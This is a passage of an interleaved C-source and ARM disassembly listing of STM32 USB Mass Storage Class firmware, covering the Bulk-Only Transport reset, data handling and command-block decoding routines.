 8009312:	bf00      	nop
 8009314:	2000010b 	.word	0x2000010b
 8009318:	2000010a 	.word	0x2000010a

0800931c <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 800931c:	b580      	push	{r7, lr}
 800931e:	b084      	sub	sp, #16
 8009320:	af00      	add	r7, sp, #0
 8009322:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009324:	687b      	ldr	r3, [r7, #4]
 8009326:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800932a:	687b      	ldr	r3, [r7, #4]
 800932c:	32b0      	adds	r2, #176	; 0xb0
 800932e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009332:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009334:	68fb      	ldr	r3, [r7, #12]
 8009336:	2b00      	cmp	r3, #0
 8009338:	d01c      	beq.n	8009374 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 800933a:	68fb      	ldr	r3, [r7, #12]
 800933c:	2200      	movs	r2, #0
 800933e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009340:	68fb      	ldr	r3, [r7, #12]
 8009342:	2201      	movs	r2, #1
 8009344:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 8009346:	4b0d      	ldr	r3, [pc, #52]	; (800937c <MSC_BOT_Reset+0x60>)
 8009348:	781b      	ldrb	r3, [r3, #0]
 800934a:	4619      	mov	r1, r3
 800934c:	6878      	ldr	r0, [r7, #4]
 800934e:	f003 fcc1 	bl	800ccd4 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 8009352:	4b0b      	ldr	r3, [pc, #44]	; (8009380 <MSC_BOT_Reset+0x64>)
 8009354:	781b      	ldrb	r3, [r3, #0]
 8009356:	4619      	mov	r1, r3
 8009358:	6878      	ldr	r0, [r7, #4]
 800935a:	f003 fcbb 	bl	800ccd4 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800935e:	4b08      	ldr	r3, [pc, #32]	; (8009380 <MSC_BOT_Reset+0x64>)
 8009360:	7819      	ldrb	r1, [r3, #0]
 8009362:	68fb      	ldr	r3, [r7, #12]
 8009364:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009368:	3210      	adds	r2, #16
 800936a:	231f      	movs	r3, #31
 800936c:	6878      	ldr	r0, [r7, #4]
 800936e:	f003 fd83 	bl	800ce78 <USBD_LL_PrepareReceive>
 8009372:	e000      	b.n	8009376 <MSC_BOT_Reset+0x5a>
    return;
 8009374:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009376:	3710      	adds	r7, #16
 8009378:	46bd      	mov	sp, r7
 800937a:	bd80      	pop	{r7, pc}
 800937c:	2000010a 	.word	0x2000010a
 8009380:	2000010b 	.word	0x2000010b

08009384 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009384:	b480      	push	{r7}
 8009386:	b085      	sub	sp, #20
 8009388:	af00      	add	r7, sp, #0
 800938a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800938c:	687b      	ldr	r3, [r7, #4]
 800938e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009392:	687b      	ldr	r3, [r7, #4]
 8009394:	32b0      	adds	r2, #176	; 0xb0
 8009396:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800939a:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 800939c:	68fb      	ldr	r3, [r7, #12]
 800939e:	2b00      	cmp	r3, #0
 80093a0:	d002      	beq.n	80093a8 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 80093a2:	68fb      	ldr	r3, [r7, #12]
 80093a4:	2200      	movs	r2, #0
 80093a6:	721a      	strb	r2, [r3, #8]
  }
}
 80093a8:	bf00      	nop
 80093aa:	3714      	adds	r7, #20
 80093ac:	46bd      	mov	sp, r7
 80093ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 80093b2:	4770      	bx	lr

080093b4 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80093b4:	b580      	push	{r7, lr}
 80093b6:	b084      	sub	sp, #16
 80093b8:	af00      	add	r7, sp, #0
 80093ba:	6078      	str	r0, [r7, #4]
 80093bc:	460b      	mov	r3, r1
 80093be:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093c0:	687b      	ldr	r3, [r7, #4]
 80093c2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093c6:	687b      	ldr	r3, [r7, #4]
 80093c8:	32b0      	adds	r2, #176	; 0xb0
 80093ca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093ce:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80093d0:	68fb      	ldr	r3, [r7, #12]
 80093d2:	2b00      	cmp	r3, #0
 80093d4:	d022      	beq.n	800941c <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 80093d6:	68fb      	ldr	r3, [r7, #12]
 80093d8:	7a1b      	ldrb	r3, [r3, #8]
 80093da:	2b02      	cmp	r3, #2
 80093dc:	d005      	beq.n	80093ea <MSC_BOT_DataIn+0x36>
 80093de:	2b02      	cmp	r3, #2
 80093e0:	db1e      	blt.n	8009420 <MSC_BOT_DataIn+0x6c>
 80093e2:	3b03      	subs	r3, #3
 80093e4:	2b01      	cmp	r3, #1
 80093e6:	d81b      	bhi.n	8009420 <MSC_BOT_DataIn+0x6c>
 80093e8:	e013      	b.n	8009412 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80093ea:	68fb      	ldr	r3, [r7, #12]
 80093ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093f0:	7f59      	ldrb	r1, [r3, #29]
 80093f2:	68fb      	ldr	r3, [r7, #12]
 80093f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093f8:	331f      	adds	r3, #31
 80093fa:	461a      	mov	r2, r3
 80093fc:	6878      	ldr	r0, [r7, #4]
 80093fe:	f000 f9e5 	bl	80097cc <SCSI_ProcessCmd>
 8009402:	4603      	mov	r3, r0
 8009404:	2b00      	cmp	r3, #0
 8009406:	da0d      	bge.n	8009424 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009408:	2101      	movs	r1, #1
 800940a:	6878      	ldr	r0, [r7, #4]
 800940c:	f000 f920 	bl	8009650 <MSC_BOT_SendCSW>
      }
      break;
 8009410:	e008      	b.n	8009424 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009412:	2100      	movs	r1, #0
 8009414:	6878      	ldr	r0, [r7, #4]
 8009416:	f000 f91b 	bl	8009650 <MSC_BOT_SendCSW>
      break;
 800941a:	e004      	b.n	8009426 <MSC_BOT_DataIn+0x72>
    return;
 800941c:	bf00      	nop
 800941e:	e002      	b.n	8009426 <MSC_BOT_DataIn+0x72>

    default:
      break;
 8009420:	bf00      	nop
 8009422:	e000      	b.n	8009426 <MSC_BOT_DataIn+0x72>
      break;
 8009424:	bf00      	nop
  }
}
 8009426:	3710      	adds	r7, #16
 8009428:	46bd      	mov	sp, r7
 800942a:	bd80      	pop	{r7, pc}

0800942c <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800942c:	b580      	push	{r7, lr}
 800942e:	b084      	sub	sp, #16
 8009430:	af00      	add	r7, sp, #0
 8009432:	6078      	str	r0, [r7, #4]
 8009434:	460b      	mov	r3, r1
 8009436:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009438:	687b      	ldr	r3, [r7, #4]
 800943a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800943e:	687b      	ldr	r3, [r7, #4]
 8009440:	32b0      	adds	r2, #176	; 0xb0
 8009442:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009446:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009448:	68fb      	ldr	r3, [r7, #12]
 800944a:	2b00      	cmp	r3, #0
 800944c:	d01e      	beq.n	800948c <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 800944e:	68fb      	ldr	r3, [r7, #12]
 8009450:	7a1b      	ldrb	r3, [r3, #8]
 8009452:	2b00      	cmp	r3, #0
 8009454:	d002      	beq.n	800945c <MSC_BOT_DataOut+0x30>
 8009456:	2b01      	cmp	r3, #1
 8009458:	d004      	beq.n	8009464 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 800945a:	e01a      	b.n	8009492 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 800945c:	6878      	ldr	r0, [r7, #4]
 800945e:	f000 f81b 	bl	8009498 <MSC_BOT_CBW_Decode>
      break;
 8009462:	e016      	b.n	8009492 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009464:	68fb      	ldr	r3, [r7, #12]
 8009466:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800946a:	7f59      	ldrb	r1, [r3, #29]
 800946c:	68fb      	ldr	r3, [r7, #12]
 800946e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009472:	331f      	adds	r3, #31
 8009474:	461a      	mov	r2, r3
 8009476:	6878      	ldr	r0, [r7, #4]
 8009478:	f000 f9a8 	bl	80097cc <SCSI_ProcessCmd>
 800947c:	4603      	mov	r3, r0
 800947e:	2b00      	cmp	r3, #0
 8009480:	da06      	bge.n	8009490 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009482:	2101      	movs	r1, #1
 8009484:	6878      	ldr	r0, [r7, #4]
 8009486:	f000 f8e3 	bl	8009650 <MSC_BOT_SendCSW>
      break;
 800948a:	e001      	b.n	8009490 <MSC_BOT_DataOut+0x64>
    return;
 800948c:	bf00      	nop
 800948e:	e000      	b.n	8009492 <MSC_BOT_DataOut+0x66>
      break;
 8009490:	bf00      	nop
  }
}
 8009492:	3710      	adds	r7, #16
 8009494:	46bd      	mov	sp, r7
 8009496:	bd80      	pop	{r7, pc}

08009498 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 8009498:	b580      	push	{r7, lr}
 800949a:	b084      	sub	sp, #16
 800949c:	af00      	add	r7, sp, #0
 800949e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80094a0:	687b      	ldr	r3, [r7, #4]
 80094a2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80094a6:	687b      	ldr	r3, [r7, #4]
 80094a8:	32b0      	adds	r2, #176	; 0xb0
 80094aa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094ae:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80094b0:	68fb      	ldr	r3, [r7, #12]
 80094b2:	2b00      	cmp	r3, #0
 80094b4:	f000 8085 	beq.w	80095c2 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 80094b8:	68fb      	ldr	r3, [r7, #12]
 80094ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094be:	695b      	ldr	r3, [r3, #20]
 80094c0:	68fa      	ldr	r2, [r7, #12]
 80094c2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094c6:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 80094c8:	68fb      	ldr	r3, [r7, #12]
 80094ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ce:	699b      	ldr	r3, [r3, #24]
 80094d0:	68fa      	ldr	r2, [r7, #12]
 80094d2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094d6:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094d8:	4b3d      	ldr	r3, [pc, #244]	; (80095d0 <MSC_BOT_CBW_Decode+0x138>)
 80094da:	781b      	ldrb	r3, [r3, #0]
 80094dc:	4619      	mov	r1, r3
 80094de:	6878      	ldr	r0, [r7, #4]
 80094e0:	f003 fd02 	bl	800cee8 <USBD_LL_GetRxDataSize>
 80094e4:	4603      	mov	r3, r0
 80094e6:	2b1f      	cmp	r3, #31
 80094e8:	d118      	bne.n	800951c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094ea:	68fb      	ldr	r3, [r7, #12]
 80094ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094f0:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094f2:	4a38      	ldr	r2, [pc, #224]	; (80095d4 <MSC_BOT_CBW_Decode+0x13c>)
 80094f4:	4293      	cmp	r3, r2
 80094f6:	d111      	bne.n	800951c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094f8:	68fb      	ldr	r3, [r7, #12]
 80094fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094fe:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009500:	2b01      	cmp	r3, #1
 8009502:	d80b      	bhi.n	800951c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009504:	68fb      	ldr	r3, [r7, #12]
 8009506:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800950a:	7f9b      	ldrb	r3, [r3, #30]
 800950c:	2b00      	cmp	r3, #0
 800950e:	d005      	beq.n	800951c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 8009510:	68fb      	ldr	r3, [r7, #12]
 8009512:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009516:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009518:	2b10      	cmp	r3, #16
 800951a:	d90f      	bls.n	800953c <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800951c:	68fb      	ldr	r3, [r7, #12]
 800951e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009522:	7f59      	ldrb	r1, [r3, #29]
 8009524:	2320      	movs	r3, #32
 8009526:	2205      	movs	r2, #5
 8009528:	6878      	ldr	r0, [r7, #4]
 800952a:	f000 fe7b 	bl	800a224 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800952e:	68fb      	ldr	r3, [r7, #12]
 8009530:	2202      	movs	r2, #2
 8009532:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009534:	6878      	ldr	r0, [r7, #4]
 8009536:	f000 f8cb 	bl	80096d0 <MSC_BOT_Abort>
 800953a:	e045      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800953c:	68fb      	ldr	r3, [r7, #12]
 800953e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009542:	7f59      	ldrb	r1, [r3, #29]
 8009544:	68fb      	ldr	r3, [r7, #12]
 8009546:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800954a:	331f      	adds	r3, #31
 800954c:	461a      	mov	r2, r3
 800954e:	6878      	ldr	r0, [r7, #4]
 8009550:	f000 f93c 	bl	80097cc <SCSI_ProcessCmd>
 8009554:	4603      	mov	r3, r0
 8009556:	2b00      	cmp	r3, #0
 8009558:	da0c      	bge.n	8009574 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 800955a:	68fb      	ldr	r3, [r7, #12]
 800955c:	7a1b      	ldrb	r3, [r3, #8]
 800955e:	2b05      	cmp	r3, #5
 8009560:	d104      	bne.n	800956c <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009562:	2101      	movs	r1, #1
 8009564:	6878      	ldr	r0, [r7, #4]
 8009566:	f000 f873 	bl	8009650 <MSC_BOT_SendCSW>
 800956a:	e02d      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800956c:	6878      	ldr	r0, [r7, #4]
 800956e:	f000 f8af 	bl	80096d0 <MSC_BOT_Abort>
 8009572:	e029      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009574:	68fb      	ldr	r3, [r7, #12]
 8009576:	7a1b      	ldrb	r3, [r3, #8]
 8009578:	2b02      	cmp	r3, #2
 800957a:	d024      	beq.n	80095c6 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 800957c:	68fb      	ldr	r3, [r7, #12]
 800957e:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009580:	2b01      	cmp	r3, #1
 8009582:	d020      	beq.n	80095c6 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009584:	68fb      	ldr	r3, [r7, #12]
 8009586:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009588:	2b03      	cmp	r3, #3
 800958a:	d01c      	beq.n	80095c6 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 800958c:	68fb      	ldr	r3, [r7, #12]
 800958e:	68db      	ldr	r3, [r3, #12]
 8009590:	2b00      	cmp	r3, #0
 8009592:	d009      	beq.n	80095a8 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009594:	68fb      	ldr	r3, [r7, #12]
 8009596:	f103 0110 	add.w	r1, r3, #16
 800959a:	68fb      	ldr	r3, [r7, #12]
 800959c:	68db      	ldr	r3, [r3, #12]
 800959e:	461a      	mov	r2, r3
 80095a0:	6878      	ldr	r0, [r7, #4]
 80095a2:	f000 f819 	bl	80095d8 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 80095a6:	e00f      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 80095a8:	68fb      	ldr	r3, [r7, #12]
 80095aa:	68db      	ldr	r3, [r3, #12]
 80095ac:	2b00      	cmp	r3, #0
 80095ae:	d104      	bne.n	80095ba <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80095b0:	2100      	movs	r1, #0
 80095b2:	6878      	ldr	r0, [r7, #4]
 80095b4:	f000 f84c 	bl	8009650 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 80095b8:	e006      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80095ba:	6878      	ldr	r0, [r7, #4]
 80095bc:	f000 f888 	bl	80096d0 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 80095c0:	e002      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
    return;
 80095c2:	bf00      	nop
 80095c4:	e000      	b.n	80095c8 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 80095c6:	bf00      	nop
    }
  }
}
 80095c8:	3710      	adds	r7, #16
 80095ca:	46bd      	mov	sp, r7
 80095cc:	bd80      	pop	{r7, pc}
 80095ce:	bf00      	nop
 80095d0:	2000010b 	.word	0x2000010b
 80095d4:	43425355 	.word	0x43425355

080095d8 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 80095d8:	b580      	push	{r7, lr}
 80095da:	b086      	sub	sp, #24
 80095dc:	af00      	add	r7, sp, #0
 80095de:	60f8      	str	r0, [r7, #12]
 80095e0:	60b9      	str	r1, [r7, #8]
 80095e2:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095e4:	68fb      	ldr	r3, [r7, #12]
 80095e6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095ea:	68fb      	ldr	r3, [r7, #12]
 80095ec:	32b0      	adds	r2, #176	; 0xb0
 80095ee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095f2:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095f4:	697b      	ldr	r3, [r7, #20]
 80095f6:	2b00      	cmp	r3, #0
 80095f8:	d023      	beq.n	8009642 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80095fa:	697b      	ldr	r3, [r7, #20]
 80095fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009600:	699b      	ldr	r3, [r3, #24]
 8009602:	687a      	ldr	r2, [r7, #4]
 8009604:	4293      	cmp	r3, r2
 8009606:	bf28      	it	cs
 8009608:	4613      	movcs	r3, r2
 800960a:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 800960c:	697b      	ldr	r3, [r7, #20]
 800960e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009612:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8009614:	687b      	ldr	r3, [r7, #4]
 8009616:	1ad3      	subs	r3, r2, r3
 8009618:	697a      	ldr	r2, [r7, #20]
 800961a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800961e:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 8009620:	697b      	ldr	r3, [r7, #20]
 8009622:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009626:	2200      	movs	r2, #0
 8009628:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 800962c:	697b      	ldr	r3, [r7, #20]
 800962e:	2204      	movs	r2, #4
 8009630:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 8009632:	4b06      	ldr	r3, [pc, #24]	; (800964c <MSC_BOT_SendData+0x74>)
 8009634:	7819      	ldrb	r1, [r3, #0]
 8009636:	693b      	ldr	r3, [r7, #16]
 8009638:	68ba      	ldr	r2, [r7, #8]
 800963a:	68f8      	ldr	r0, [r7, #12]
 800963c:	f003 fbe4 	bl	800ce08 <USBD_LL_Transmit>
 8009640:	e000      	b.n	8009644 <MSC_BOT_SendData+0x6c>
    return;
 8009642:	bf00      	nop
}
 8009644:	3718      	adds	r7, #24
 8009646:	46bd      	mov	sp, r7
 8009648:	bd80      	pop	{r7, pc}
 800964a:	bf00      	nop
 800964c:	2000010a 	.word	0x2000010a

08009650 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009650:	b580      	push	{r7, lr}
 8009652:	b084      	sub	sp, #16
 8009654:	af00      	add	r7, sp, #0
 8009656:	6078      	str	r0, [r7, #4]
 8009658:	460b      	mov	r3, r1
 800965a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800965c:	687b      	ldr	r3, [r7, #4]
 800965e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009662:	687b      	ldr	r3, [r7, #4]
 8009664:	32b0      	adds	r2, #176	; 0xb0
 8009666:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800966a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800966c:	68fb      	ldr	r3, [r7, #12]
 800966e:	2b00      	cmp	r3, #0
 8009670:	d024      	beq.n	80096bc <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 8009672:	68fb      	ldr	r3, [r7, #12]
 8009674:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009678:	461a      	mov	r2, r3
 800967a:	4b12      	ldr	r3, [pc, #72]	; (80096c4 <MSC_BOT_SendCSW+0x74>)
 800967c:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 800967e:	68fb      	ldr	r3, [r7, #12]
 8009680:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009684:	461a      	mov	r2, r3
 8009686:	78fb      	ldrb	r3, [r7, #3]
 8009688:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 800968c:	68fb      	ldr	r3, [r7, #12]
 800968e:	2200      	movs	r2, #0
 8009690:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 8009692:	4b0d      	ldr	r3, [pc, #52]	; (80096c8 <MSC_BOT_SendCSW+0x78>)
 8009694:	7819      	ldrb	r1, [r3, #0]
 8009696:	68fb      	ldr	r3, [r7, #12]
 8009698:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 800969c:	3210      	adds	r2, #16
 800969e:	230d      	movs	r3, #13
 80096a0:	6878      	ldr	r0, [r7, #4]
 80096a2:	f003 fbb1 	bl	800ce08 <USBD_LL_Transmit>
